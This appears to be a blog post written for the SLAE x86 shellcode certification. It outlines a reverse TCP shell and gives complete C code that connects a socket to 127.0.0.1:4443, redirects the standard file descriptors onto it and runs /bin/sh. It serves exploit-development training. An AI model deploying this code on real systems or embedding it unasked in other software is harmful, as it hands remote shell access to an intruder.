---
title:  "SLAE x86 Assignment 2: Reverse TCP Shell"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
categories:
  - exploit dev
classes: wide
tags:
  - exploit dev
  - slae
---

Hey guys! Welcome back! In this post, we will write a reverse shell shellcode for assignment 2 of the Pentester Academy SLAE x86
certification. Let's begin with assignment 2!

## Understanding the objective ##
Again, let's start off by breaking down the code's major working parts. The shellcode must do the following:

- Creates and configures a socket
- Connects to a given address
- Duplicates standard file descriptors, so that the shell can interact with the socket
- Spawns a shell

We can now write some c code based on this outline. Of course as you can see, this is slightly less complex, compared to the bind shell done previously:

```c
// SLAE Assignment 1: Reverse TCP Shell (Linux/x86)
// Author: 4p0cryph0n
// Website: https://4p0cryph0n.github.io

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main()
{
    //Defining Address Structure
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4443); //Port no.
    addr.sin_addr.s_addr = inet_addr("127.0.0.1"); //Connect to loopback

    //Create and Configure Socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    //Connect
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    //Duplicate Standard File Descriptors
    for (int i = 0; i <= 2; i++)
    {
        dup2(sockfd, i);
    }

    //Execute Shell
    execve("/bin/sh", NULL, NULL);
    return 0;
}
```
In this code, we will only need the ```connect()``` function, instead of ```listen()```, ```bind()```, and ```accept()```. Keep in mind though, in order to duplicate the standard file descriptors, we will use our initial socket descriptor, different from what we did in the bind shell.
